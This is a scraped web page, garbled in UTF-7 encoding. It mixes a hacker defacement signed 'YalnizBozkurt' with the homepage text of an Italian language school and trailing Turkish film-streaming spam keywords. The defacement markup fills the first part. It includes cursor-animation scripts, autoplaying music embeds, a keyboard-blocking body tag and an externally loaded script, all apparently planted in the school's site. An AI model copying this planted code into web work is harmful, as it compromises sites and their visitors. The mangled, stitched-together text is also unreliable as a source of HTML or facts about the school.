++ADw-span class+AD0AIg-style15+ACIAPgA8-strong+AD4A3A-lk+APw U+ACYAIw-287+ADs-runda G+APY-n+APw-ller Delidir, Ki+ACYAIw-351+ADs-iler +ANw-lk+APw U+ACYAIw-287+ADs-runda +ANY-lmelidir..+ACEAPA-/strong+AD4APA-/span+AD4
++ADw-/marquee+AD4
++ADw-strong+AD4APA-/strong+AD4
++ADw-script type+AD0AIg-text/javascript+ACIAPg function showHideFX()+AHs var FX +AD0 document.getElementById(+ACI-FX+ACI)+ADs var w +AD0 FX.offsetWidth+ADs FX.opened ? moveFX(0, 40-w) : moveFX(40-w, 0)+ADs FX.opened +AD0 +ACE-FX.opened+ADs +AH0 function moveFX(x0, xf)+AHs var FX +AD0 document.getElementById(+ACI-FX+ACI)+ADs var dx +AD0 Math.abs(x0-xf) +AD4 10 ? 5 : 1+ADs var dir +AD0 xf+AD4-x0 ? 1 : -1+ADs var x +AD0 x0 +ACs dx +ACo dir+ADs FX.style.right +AD0 x.toString() +ACs +ACI-px+ACIAOw if(x0+ACEAPQ-xf)+AHs-setTimeout(+ACI-moveFX(+ACIAKw-x+ACsAIg, +ACIAKw-xf+ACsAIg)+ACI, 10)+ADsAfQ +AH0 +ADw-/script+AD4
++ADw-/div+AD4
++ADw-param name+AD0AIg-movie+ACI value+AD0AIg-http://www.cyber-warrior.org/iphacked/fair.swff+ACIAPg
++ADw-param name+AD0AIg-bgcolor+ACI value+AD0AIgAj-000000+ACIAPg
++ADw-param name+AD0AIg-FlashVars+ACI value+AD0AIg-mp3+AD0-http://k003.kiwi6.com/hotlink/dyd2mv9un6/muhtesem+AF8-yuezyil+AF8-mehter+AF8-marsi.mp3+ACY-amp+ADs-autoplay+AD0-1+ACY-amp+ADs-loadingcolor+AD0-000000+ACY-amp+ADs-slidercolo+ACIAPg +ADw-/object+AD4
++ADw-/font+AD4
++ADw-/div+AD4APA-/b+AD4APA-/body+AD4APA-/html+AD4
++ADw-script language+AD0AIg-javascript+ACI src+AD0AIg-http://in.sitekodlari.com/sagtus.js+ACIAPgA8-/script+AD4
++ADw-style+AD4
++ACM-fifteenth, +ACM-sixteenth+AHs-position:absolute+ADs-left:0+ADs-top:0+ADs-width:1px+ADs-height:1px+ADs-layer-background-color:black+ADs-background-color:+ACM-00FF00+ADs-z-index:100+ADs-font-size:1px+ADsAfQ
++ADw-/style+AD4
++ADw-script language+AD0′javascript’ type+AD0′text/javascript’+AD4
+first3+AD0-24+ADs
+if (document.all+ACYAJgAh-window.print)+AHs-fifteenth.style.width+AD0-document.body.clientWidth-3+ADs-sixteenth.style.height+AD0-document.body.clientHeight-1+ADsAfQ-second3+AD0-first3+ACs-6+ADs third3+AD0-first3+ACs-second3+ADs fourth3+AD0-first3+ACs-second3+ACs-third3+ADs fifth3+AD0-fourth3/third3+ACo-first3+ADs sixth3+AD0-third3+ACo-first3/12+ACo-second3+ADs seventh3+AD0-first3+ACs-second3/fifth3-16+ACo-fourth3+ADs eighth3+AD0-sixth3+ACo(first3-5)/third3+ACs-fourth3+ADs ninth3+AD0-eighth3/seventh3+ACs-first3+ACo-third3-fourth3+ADs-tenth3+AD0(ninth3+ACs-first3/third3+ACo-fourth3+ACs-second3+ACo-fifth3)/sixth3+ACs-eighth3-ninth3-1+ADs-eleventh3+AD0-Math.floor(tenth3) +ADs-twelfth3+AD0-eleventh3-58+ADs
+function seventeenth()+AHs-fifteenth.style.pixelTop+AD0-document.body.scrollTop+ACs-event.clientY+ACs-twelfth3+ADs-sixteenth.style.pixelTop+AD0-document.body.scrollTop+ADs
+if (event.clientX+ADw-document.body.clientWidth-twelfth3)sixteenth.style.pixelLeft+AD0-document.body.scrollLeft+ACs-event.clientX+ACs-twelfth3+ADs
+else sixteenth.style.pixelLeft+AD0-document.body.clientWidth-twelfth3+ADsAfQ
+function eighteenth(nineteenth)+AHs-document.fifteenth.top+AD0-nineteenth.y+ACs-twelfth3+ADs-document.sixteenth.top+AD0-pageYOffset+ADs-document.sixteenth.left+AD0-nineteenth.x+ACs-twelfth3+ADsAfQ
+if (document.all)document.onmousemove+AD0-seventeenth+ADs
+function twentieth()+AHs-window.location.reload()+ADsAfQ
+function first2()+AHs-setTimeout(‘window.onresize+AD0-twentieth’,300)+ADsAfQ
+if ((document.all+ACYAJgAh-window.print)+AHwAfA-document.layers)window.onload+AD0-first2+ADs-document.write(+ACIAPA-div id+AD0′fifteenth’ style+AD0′width:expression(document.body.clientWidth-twelfth3)’+AD4APA-/div+AD4APA-div id+AD0′sixteenth’ style+AD0′height:expression(document.body.clientHeight-twelfth3)’+AD4APA-/div+AD4AIg)+ADs
++ADw-/script+AD4
++ADw-span style+AD0AIg-font-family: Fixedsys+ADsAIgA+ADw-/span+AD4APA-/p+AD4APA-/span+AD4APA-script language+AD0AIg-javascript+ACIAPg-var text+AD0′Hacked YalnizBozkurt…+ACE’+ADs-var delay+AD0-5+ADs var Xoff+AD0-0+ADs var Yoff+AD0–30+ADs-var txtw+AD0-10+ADs var beghtml+AD0′+ADw-font color+AD0AIgAj-FFFFFF+ACIAPgA8-b+AD4′+ADs var endhtml+AD0′+ADw-/b+AD4APA-/font+AD4′+ADs ns4 +AD0 (navigator.appName.indexOf(+ACI-Netscape+ACI)+AD4APQ-0 +ACYAJg document.layers)? true : false+ADs-ie4 +AD0 (document.all +ACYAJg +ACE-document.getElementById)? true : false+ADs-ie5 +AD0 (document.all +ACYAJg document.getElementById)? true : false+ADs-ns6 +AD0 (document.getElementById +ACYAJg navigator.appName.indexOf(+ACI-Netscape+ACI)+AD4APQ-0 )? true: false+ADs-var txtA+AD0-new Array()+ADs-text+AD0-text.split(”)+ADs-var x1+AD0-0+ADs-var y1+AD0–50+ADs-var t+AD0”+ADs-for(i+AD0-1+ADs-i+ADwAPQ-text.length+ADs-i+ACsAKw)+AHs-t+ACsAPQ(ns4)? ‘+ADw-layer left+AD0AIg-0+ACI top+AD0AIg–100+ACI width+AD0AIg’+ACs-txtw+ACs’+ACI name+AD0AIg-txt’+ACs-i+ACs’+ACI height+AD0AIg-1+ACIAPg’ : ‘+ADw-div id+AD0AIg-txt’+ACs-i+ACs’+ACI style+AD0AIg-position:absolute+ADs top:-100px+ADs left:0px+ADs height:1px+ADs width:’+ACs-txtw+ACs’+ADs visibility:visible+ADsAIgA+’+ADs-t+ACsAPQ-beghtml+ACs-text+AFs-i-1+AF0AKw-endhtml+ADs-t+ACsAPQ(ns4)? ‘+ADw-/layer+AD4′ : ‘+ADw-/div+AD4′+ADsAfQ-document.write(t)+ADs-function moveid(id,x,y)+AHs-if(ns4)id.moveTo(x,y)+ADs-else+AHs-id.style.left+AD0-x+ACs’px’+ADs-id.style.top+AD0-y+ACs’px’+ADsAfQB9-function animate(evt)+AHs-x1+AD0-Xoff+ACs((ie4+AHwAfA-ie5)?event.clientX+ACs-document.body.scrollLeft:evt.pageX)+ADs-y1+AD0-Yoff+ACs((ie4+AHwAfA-ie5)?event.clientY+ACs-document.body.scrollTop:evt.pageY)+ADsAfQ-function getidleft(id)+AHs-if(ns4)return id.left+ADs-else return parseInt(id.style.left)+ADsAfQ-function getidtop(id)+AHs-if(ns4)return id.top+ADs-else return parseInt(id.style.top)+ADsAfQ-function getwindowwidth()+AHs-if(ie4+AHwAfA-ie5)return document.body.clientWidth+ACs-document.body.scrollLeft+ADs-else return window.innerWidth+ACs-pageXOffset+ADsAfQ-function movetxts()+AHs-for(i+AD0-text.length+ADs-i+AD4-1+ADs-i+AD0-i-1)+AHs-if(getidleft(txtA+AFs-i-1+AF0)+ACs-txtw+ACo-2+AD4APQ-getwindowwidth())+AHs-moveid(txtA+AFs-i-1+AF0,0,-100)+ADs-moveid(txtA+AFs-i+AF0,0,-100)+ADsAfQ-else moveid(txtA+AFs-i+AF0, getidleft(txtA+AFs-i-1+AF0)+ACs-txtw, getidtop(txtA+AFs-i-1+AF0))+ADsAfQ-moveid(txtA+AFs-1+AF0,x1,y1)+ADsAfQ-window.onload+AD0-function()+AHs-for(i+AD0-1+ADs-i+ADwAPQ-text.length+ADs-i+ACsAKw)txtA+AFs-i+AF0APQ(ns4)?document.layers+AFs’txt’+ACs-i+AF0:(ie4)?document.all+AFs’txt’+ACs-i+AF0:document.getElementById(‘txt’+ACs-i)+ADs-if(ns4)document.captureEvents(Event.MOUSEMOVE)+ADs-document.onmousemove+AD0-animate+ADs-setInterval(‘movetxts()’,delay)+ADsAfQA8-/script+AD4APA-script language+AD0AIg-JavaScript+ACI type+AD0AIg-text/javascript+ACIAPg-var xCol +AD0 +ACIAIw-FF0000+ACIAOw-var yCol +AD0 +ACIAIw-990000+ACIAOw-var zCol +AD0 +ACIAIw-FF3300+ACIAOw-var n +AD0 6+ADs
+//number of dots per trail.var t +AD0 40+ADs
+//setTimeout speed.var s +AD0 0.2+ADs //effect speed.var r,h,w+ADs-var d +AD0 document+ADs-var my +AD0 10+ADs-var mx +AD0 10+ADs-var stp +AD0 0+ADs-var evn +AD0 360/3+ADs-var vx +AD0 new Array()+ADs-var vy +AD0 new Array()+ADs-var vz +AD0 new Array()+ADs-var dy +AD0 new Array()+ADs-var dx +AD0 new Array()+ADs-var pix +AD0 +ACI-px+ACIAOw-var strictmod +AD0 ((document.compatMode) +ACYAJg document.compatMode.indexOf(+ACI-CSS+ACI) +ACEAPQ -1)+ADs-var domWw +AD0 (typeof window.innerWidth +AD0APQ +ACI-number+ACI)+ADs-var domSy +AD0 (typeof window.pageYOffset +AD0APQ +ACI-number+ACI)+ADs-var idx +AD0 d.getElementsByTagName(‘div’).length+ADs-for (i +AD0 0+ADs i +ADw n+ADs i+ACsAKw)+AHs
+var dims +AD0 (i+ACs-1)/2+ADs
+d.write(‘+ADw-div id+AD0AIg-x’+ACs(idx+ACs-i)+ACs’+ACI style+AD0AIg-position:absolute+ADs’
++ACs’top:0px+ADs-left:0px+ADs-width:’+ACs-dims+ACs’px+ADs-height:’+ACs-dims+ACs’px+ADs’
++ACs’background-color:’+ACs-xCol+ACs’+ADs-font-size:’+ACs-dims+ACs’px+ACIAPgA8-/div+AD4′
++ACs’+ADw-div id+AD0AIg-y’+ACs(idx+ACs-i)+ACs’+ACI style+AD0AIg-position:absolute+ADs-top:0px+ADs’
++ACs’left:0px+ADs-width:’+ACs-dims+ACs’px+ADs-height:’+ACs-dims+ACs’px+ADs’
++ACs’background-color:’+ACs-yCol+ACs’+ADs-font-size:’+ACs-dims+ACs’px+ACIAPgA8-/div+AD4′
++ACs’+ADw-div id+AD0AIg-z’+ACs(idx+ACs-i)+ACs’+ACI style+AD0AIg-position:absolute+ADs-top:0px+ADs’
++ACs’left:0px+ADs-width:’+ACs-dims+ACs’px+ADs-height:’+ACs-dims+ACs’px+ADs’
++ACs’background-color:’+ACs-zCol+ACs’+ADs-font-size:’+ACs-dims+ACs’px+ACIAPgA8-/div+AD4′)+ADsAfQ-if (domWw) r +AD0 window+ADs-else+AHs
+if (d.documentElement +ACYAJg
+typeof d.documentElement.clientWidth +AD0APQ +ACI-number+ACI +ACYAJg
+d.documentElement.clientWidth +ACEAPQ 0)
+r +AD0 d.documentElement+ADs
+else
++AHs
+if (d.body +ACYAJg typeof d.body.clientWidth +AD0APQ +ACI-number+ACI)
+r +AD0 d.body+ADs
++AH0AfQ-function winsize()+AHs
+var oh,sy,ow,sx,rh,rw+ADs
+if (domWw)
++AHs
+if (d.documentElement +ACYAJg d.defaultView +ACYAJg
+typeof d.defaultView.scrollMaxY +AD0APQ +ACI-number+ACI)
++AHs
+oh +AD0 d.documentElement.offsetHeight+ADs
+sy +AD0 d.defaultView.scrollMaxY+ADs
+ow +AD0 d.documentElement.offsetWidth+ADs
+sx +AD0 d.defaultView.scrollMaxX+ADs
+rh +AD0 oh-sy+ADs
+rw +AD0 ow-sx+ADs
++AH0
+else
++AHs
+rh +AD0 r.innerHeight+ADs
+rw +AD0 r.innerWidth+ADs
++AH0
+h +AD0 rh+ADs
+w +AD0 rw+ADs
++AH0
+else
++AHs
+h +AD0 r.clientHeight+ADs
+w +AD0 r.clientWidth+ADs
++AH0AfQ-function scrl(yx)+AHs
+var y,x+ADs
+if (domSy)
++AHs
+y +AD0 r.pageYOffset+ADs
+x +AD0 r.pageXOffset+ADs
++AH0
+else
++AHs
+y +AD0 r.scrollTop+ADs
+x +AD0 r.scrollLeft+ADs
++AH0
+return (yx +AD0APQ 0)?y:x+ADsAfQ-function mouse(e)+AHs
+var msy +AD0 (domSy)?window.pageYOffset:0+ADs
+if (+ACE-e) e +AD0 window.event+ADs
+if (typeof e.pageY +AD0APQ ‘number’)
++AHs
+my +AD0 e.pageY – msy +ACs 16+ADs
+mx +AD0 e.pageX +ACs 6+ADs
++AH0
+else
++AHs
+my +AD0 e.clientY – msy +ACs 16+ADs
+mx +AD0 e.clientX +ACs 6+ADs
++AH0
+if (my +AD4 h-65) my +AD0 h-65+ADs
+if (mx +AD4 w-50) mx +AD0 w-50+ADsAfQ-function assgn()+AHs
+for (j +AD0 0+ADs j +ADw 3+ADs j+ACsAKw)
++AHs
+dy+AFs-j+AF0 +AD0 my +ACs 50 +ACo Math.cos(stp+ACs-j+ACo-evn+ACo-Math.PI/180) +ACo Math.sin((stp+ACs-j+ACo-25)/2) +ACs scrl(0) +ACs pix+ADs
+dx+AFs-j+AF0 +AD0 mx +ACs 50 +ACo Math.sin(stp+ACs-j+ACo-evn+ACo-Math.PI/180) +ACo Math.sin((stp+ACs-j+ACo-25)/2) +ACo Math.sin(stp/4) +ACs pix+ADs
++AH0
+stp+ACsAPQ-s+ADs
+for (i +AD0 0+ADs i +ADw n+ADs i+ACsAKw)
++AHs
+if (i +ADw n-1)
++AHs
+vx+AFs-i+AF0.top +AD0 vx+AFs-i+ACs-1+AF0.top+ADs vx+AFs-i+AF0.left +AD0 vx+AFs-i+ACs-1+AF0.left+ADs
+vy+AFs-i+AF0.top +AD0 vy+AFs-i+ACs-1+AF0.top+ADs vy+AFs-i+AF0.left +AD0 vy+AFs-i+ACs-1+AF0.left+ADs
+vz+AFs-i+AF0.top +AD0 vz+AFs-i+ACs-1+AF0.top+ADs vz+AFs-i+AF0.left +AD0 vz+AFs-i+ACs-1+AF0.left+ADs
++AH0
+else
++AHs
+vx+AFs-i+AF0.top +AD0 dy+AFs-0+AF0AOw vx+AFs-i+AF0.left +AD0 dx+AFs-0+AF0AOw
+vy+AFs-i+AF0.top +AD0 dy+AFs-1+AF0AOw vy+AFs-i+AF0.left +AD0 dx+AFs-1+AF0AOw
+vz+AFs-i+AF0.top +AD0 dy+AFs-2+AF0AOw vz+AFs-i+AF0.left +AD0 dx+AFs-2+AF0AOw
++AH0
++AH0
+setTimeout(assgn,t)+ADsAfQ-function init()+AHs
+for (i +AD0 0+ADs i +ADw n+ADs i+ACsAKw)
++AHs
+vx+AFs-i+AF0 +AD0 document.getElementById(+ACI-x+ACIAKw(idx+ACs-i)).style+ADs
+vy+AFs-i+AF0 +AD0 document.getElementById(+ACI-y+ACIAKw(idx+ACs-i)).style+ADs
+vz+AFs-i+AF0 +AD0 document.getElementById(+ACI-z+ACIAKw(idx+ACs-i)).style+ADs
++AH0
+winsize()+ADs
+assgn()+ADsAfQ-if (window.addEventListener)+AHs
+window.addEventListener(+ACI-resize+ACI,winsize,false)+ADs
+window.addEventListener(+ACI-load+ACI,init,false)+ADs
+document.addEventListener(+ACI-mousemove+ACI,mouse,false)+ADsAfQ
+else if (window.attachEvent)+AHs
+window.attachEvent(+ACI-onload+ACI,init)+ADs
+document.attachEvent(+ACI-onmousemove+ACI,mouse)+ADs
+window.attachEvent(+ACI-onresize+ACI,winsize)+ADsAfQ +ADw-/script+AD4
++ADw-EMBED src+AD0AIg-http://www.muhiddin.net/mehter/11.php+ACI width+AD0-0 height+AD0-0 type+AD0-audio/mpeg loop+AD0AIg-true+ACI autostart+AD0AIg-true+ACIAPgA8-/embed+AD4 +ADw-/font+AD4
++ADw-/div+AD4APA-/b+AD4APA-/body+AD4APA-/html+AD4
++ADw-script type+AD0AIg-text/javascript+ACI src+AD0AIg-http://analytics.hosting24.com/count.php+ACIAPgA8-/script+AD4
++ADw-noscript+AD4APA-a href+AD0AIg-http://www.hosting24.com/+ACIAPgA8-img src+AD0AIg-http://analytics.hosting24.com/count.php+ACI alt+AD0AIg-web hosting+ACI /+AD4APA-/a+AD4APA-/noscript+AD4
++ADw-img src+AD0AIg-http://i357.photobucket.com/albums/oo15/leelee123+AF8-a25/hacked.gif+ACI border+AD0AIg-0+ACI alt+AD0AIg-Photobucket+ACIAPgA8-/a+AD4
++ADw-b+AD4APA-/b+AD4APA-br+AD4
++ADw-br+AD4
++ADw-span class+AD0AIg-style12+ACIAPgA8-/b+AD4 +ADw-span class+AD0AIg-style13+ACIAPgA8-marquee+AD4-CaN+ACYAIw-305+ADs YaNaN SaBReTSiN, CaN+ACYAIw-305+ADs YaKaNDa YaNaCaG+ACYAIw-305+ADs G+APw-N+APw BeKLeSiN.. +ACEAIQAh +AFs HZ MuHaMMeD s.a.v +AF0APA-/marquee+AD4APA-/span+AD4APA-/span+AD4 +ADw-br+AD4
++ADw-br+AD4
++ADw-br /+AD4
++ADw-body onkeydown+AD0AIg-return false+ACIAPg
++ADwAIQ—hacked by YalnizBozkurT–+AD4
++ADwAIQ—hacked by Yalniz-BozkurT–+AD4
++ADw-/body+AD4
++ADw-/html+AD4APA-DIV style+AD0AIg-DISPLAY: none+ACIAPgA8-xmp+AD4-
+facebooktwitterlinkedinpintrest
+HomeChi SiamoTEFL Apply Now Moderation Date and Fees FAQ Why Rome AccomodationCorsi e Metodo Corsi per Aziende Corsi Adulti Corsi Bambini e RagazziServizi Traduzioni e Interpretariato Studiare all’EsteroLingue Inglese Italian for Foreigners Spagnolo Francese Tedesco Portoghese Russo Arabo PolaccoContatti Apply for a jobSummer School Campo Scuola Select PageHomeChi SiamoTEFL    Apply Now    Moderation    Date and Fees    FAQ    Why Rome    AccomodationCorsi e Metodo    Corsi per Aziende    Corsi Adulti    Corsi Bambini e RagazziServizi    Traduzioni e Interpretariato    Studiare all’EsteroLingue    Inglese    Italian for Foreigners    Spagnolo    Francese    Tedesco    Portoghese    Russo    Arabo    PolaccoContatti    Apply for a jobSummer School    Campo Scuola
+Visualizza le nostre OFFERTE SPECIALI
+.:Corsi per aziende:.
+Ogni anno Enti Pubblici, piccole e grandi Aziende si avvalgono di Language System College per potenziare e…
+.:Corsi TEFL:.
+TEFL International Ã¨ uno dei piÃ¹ grandi operatori linguistici con un network di oltre 20 scuole nel Mondo…
+.:Studiare all'Estero:.
+Studiare a BOURNEMOUTH situata sulla costa meridionale dellâInghilterra, di fronte allâisola …
+.:In evidenza:.
+Scopri
+leÂ OFFERTE
+di Language System College.
+..
+Visualizza le nostre NEWS
+Language System College S.r.l. P.IVA/Codice Fiscale 11394271008
+omer, omercitak, php
+Film izle
+Online Film izle
